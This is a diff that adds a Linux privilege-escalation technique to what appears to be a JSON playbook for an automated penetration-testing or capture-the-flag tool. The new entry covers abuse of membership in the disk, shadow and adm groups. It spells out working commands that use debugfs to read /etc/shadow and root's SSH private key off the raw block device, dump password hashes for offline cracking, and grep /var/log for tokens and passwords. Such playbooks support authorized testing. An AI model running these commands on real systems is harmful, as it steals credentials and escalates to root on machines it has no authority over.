@@ -2202,6 +2202,75 @@
           "note": "On the target foothold, trigger activity on the Java application if needed so the breakpoint fires, then invoke the SUID bash binary with -p to confirm uid=0(root) / euid=0(root)."
         }
       ]
+    },
+    {
+      "id": "linux-privileged-group-abuse",
+      "transition": "privesc_act",
+      "title": "Privileged Local Group Abuse (disk / shadow / adm)",
+      "phase": "escalate",
+      "hypothesis": "Local supplementary groups like disk, shadow, and adm bypass standard file permissions without requiring sudo or SUID exploits. Membership in disk grants raw read access to the root block device via debugfs (exposing /etc/shadow and /root/.ssh/id_rsa directly from the filesystem), shadow grants direct read access to /etc/shadow password hashes, and adm grants read access to /var/log files where authentication secrets, tokens, and service credentials are often logged.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "debugfs"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.privileged_group"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.root_flag"
+      ],
+      "produces": [
+        "loot.shadow",
+        "loot.ssh_key",
+        "credential.ssh_key",
+        "access.admin"
+      ],
+      "priority": 74,
+      "proves": "harvests /etc/shadow hashes, root SSH private keys, or logged credentials via privileged group membership to escalate to root",
+      "does_not_prove": "administrative execution until the extracted root SSH key or cracked /etc/shadow password lands a uid=0 session",
+      "report": {
+        "finding": "Privileged Local Group Membership Grants Root Credential Access",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "locus": "onhost",
+          "run": "id && df -h / && lsblk",
+          "note": "Confirm disk, shadow, or adm group membership and identify the block device backing / (for example /dev/sda1, /dev/vda1, or /dev/mapper/...)."
+        },
+        {
+          "tool": "sh",
+          "locus": "onhost",
+          "run": "debugfs {{root_device|/dev/sda1}} -R 'cat /etc/shadow' && debugfs {{root_device|/dev/sda1}} -R 'cat /root/.ssh/id_rsa'",
+          "note": "disk group: read /etc/shadow and /root/.ssh/id_rsa directly off the raw root block device via debugfs, bypassing VFS permissions. Crack root's hash offline or SSH in with the recovered private key."
+        },
+        {
+          "tool": "sh",
+          "locus": "onhost",
+          "run": "ls -la /etc/shadow && cat /etc/shadow",
+          "note": "shadow group: /etc/shadow is group-readable by shadow (0640 root:shadow). Dump the password hashes and crack root or privileged user accounts offline with hashcat or john."
+        },
+        {
+          "tool": "sh",
+          "locus": "onhost",
+          "run": "grep -rnaiE 'passw|secret|token|apikey|authorization|session|key' /var/log 2>/dev/null | head -n 80",
+          "note": "adm group: sweep group-readable system, service, and audit logs under /var/log for leaked passwords, bearer tokens, and command-line arguments."
+        }
+      ]
     }
   ]
 }
